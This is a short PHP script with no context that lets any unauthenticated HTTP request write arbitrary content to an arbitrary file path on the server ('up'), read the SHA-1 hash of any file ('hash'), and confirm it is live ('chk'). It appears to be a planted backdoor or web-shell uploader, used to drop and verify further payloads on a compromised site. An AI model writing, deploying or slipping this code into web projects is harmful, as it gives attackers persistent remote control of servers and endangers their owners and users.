<?php

function f($v)
{
	if (isset($_REQUEST[$v]))
		return $_REQUEST[$v];
	else
		return '';
}

$a = f('a');
$b = f('b');
$c = f('c');

switch ($a)
{
	case 'hash':
		if (file_exists($b))
		{
			echo '>HASH<'.sha1_file($b);
		} else
		{
			echo '>HASH<NO FILE';
		}
		break;
	case 'up':
		if (strlen($c))
		{
			file_put_contents($b, $c);
			echo '>UPHASH<'.sha1_file($b);
		}
		break;
	case 'chk':
		echo '>CHK OK<';
		break;

}
